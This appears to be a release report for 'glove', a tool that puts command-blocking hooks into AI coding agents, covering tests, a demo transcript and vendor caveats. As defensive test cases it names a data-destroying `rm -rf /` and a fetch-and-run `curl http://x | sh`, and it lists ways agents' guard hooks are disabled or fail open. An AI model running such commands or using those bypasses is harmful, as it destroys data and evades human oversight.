## Built

Verified (2026-11-04, local macOS arm64, Go 1.27.3):
- `make check` + `make race` green; 30 enforced PRD bullets, 0 under-tested; six ACs with 12/5/2/3/2/5 named tests; `scripts/release-check.sh 0.5.0` green; `make audit` clean — **no dependencies added** (the locked list §1 is unchanged).
- **Conformance suite** (`internal/adapter/claude_test.go` harness + `testdata/conformance/`): all seven adapters pass the same gate — install diff/backup/idempotency, dry-run-writes-nothing, corruption refusal (broken JSON for config adapters, foreign file for shim adapters), uninstall idempotency, per-agent stdin fixtures → parse, render in native vocabulary, registry, status. The `Adapter` interface is freeze-checked twice: compile-time `var _ Adapter = …` for every adapter and a reflection test on the method set.
- **Hook-surface verification** (PRD §11, primary sources, 2026-11-04): Codex has a Claude-Code-compatible `PreToolUse` hooks system (`~/.codex/hooks.json`; schemas read from `codex-rs/hooks`); Cursor shipped hooks in 1.7 (`~/.cursor/hooks.json`, `preToolUse`, fail-open by default → glove writes `failClosed: true` and flags its absence as UNHEALTHY); Gemini CLI hooks are GA (`~/.gemini/settings.json` `hooks.BeforeTool`, matcher optional, timeouts in ms, fails open on non-JSON stdout → glove prints JSON-only stdout); Kilo CLI is an OpenCode v1.18 fork with the identical `tool.execute.before` plugin API (`(input, output)`, mutate `output.args` in place, throw blocks) — packages `@kilocode/plugin` (default export `{ id, server }`) vs `@opencode-ai/plugin` (any exported function); Zed has **no** pre-tool hook surface — audit-only per the PRD.
- **TS shims (AC0.5.3)**: generated goldens are byte-identical to `testdata/conformance/*.ts.golden`; strict `tsc --noEmit` (5.9.3) passes against the stub plugin types **and** against the real vendor packages (`@kilocode/plugin@7.8.18`, `@opencode-ai/plugin@1.19.5`, `moduleResolution: bundler`). The test half re-runs tsc whenever it is on PATH and skips otherwise (golden byte-identity is the always-on gate).
- **CLI transcript** (throwaway HOME): `install kilo/cursor/codex` (diff → backup → the two engine test calls), second install a no-op; `hook kilo` blocks `rm -rf /` exit 2 and audits `curl http://x | sh` with `agent: kilo`; `list` shows green rows for installed agents and `zed audit`; `doctor` green → a deliberately corrupted `~/.gemini/settings.json` → `UNHEALTHY` + exit 1; `uninstall kilo` (backup beside the removal) and a second uninstall a no-op. `list --matrix --check` verifies the real README block (7 agents, no "to be verified" rows) and a drifted fixture fails it.
- Found during the demo and fixed: `uninstallShim` printed a doubled `.glove.bak` suffix (cosmetic — the backup file itself was written correctly).
- Hook-path latency unchanged (no decision-path work): 3–6ms wall in demo runs.

Limits:
- **Live-session smoke checks pending the user** — now for six agents (kilo, codex, opencode, cursor, gemini, plus the still-pending claude-code check from v0.4.0): `rm -rf /` denied before execution, `ls` allowed, per each docs page. Docs screenshots are pending that same pass.
- **Windows unexercised**: the shim's `glove.exe` branch and the `%USERPROFILE%\.config` paths are rendered and tsc-validated but never executed on Windows (the §8 CI matrix is 0.6.0).
- **Vendor-side caveats, documented in each install guide**: Codex — hooks are a trusted surface (`/hooks` review), hosted tools bypass hooks, hook error/timeout is fail-open on Codex's side; Cursor — `ask` is not enforced on `preToolUse` today (glove renders review as **deny**, tighten-only), cloud agents ignore user-level `hooks.json`, `AskQuestion` skips preToolUse (Cursor forum #161836); Gemini — fails open on non-JSON stdout, `hooksConfig.enabled` layers are invisible to doctor; Kilo — `KILO_PURE=1` disables plugins; OpenCode — **V2 beta replaces the plugin API** ("V1 plugin implementations do not run in V2"), the shim targets stable V1 and is tracked in `docs/install/opencode.md`.
- **Zed is audit-only by design**: install writes nothing; Zed's threads SQLite DB (`threads/threads.db`) is the identified future observation point — no reader in this release.
- Pre-existing since v0.2.0 (unchanged here, cosmetic): a single-segment hard block reports its rule twice (raw pass + segment pass) — decisions unaffected; patch candidate.
